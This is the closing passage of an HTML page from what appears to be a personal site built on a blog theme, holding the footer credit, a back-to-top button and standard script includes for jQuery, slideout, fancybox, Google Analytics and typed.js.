+<span class=heart><i class="iconfont icon-heart"></i></span><span class=author>Andrew Wong (z5206677)</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script><script type=text/javascript src=../../../dist/even.26188efa.min.js></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-107434487-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script src=../../../js/typed.js@2.0.9></script><script src=../../../js/typedjs.shortcode.js></script><script src=../../../js/offsite.js></script></body></html>
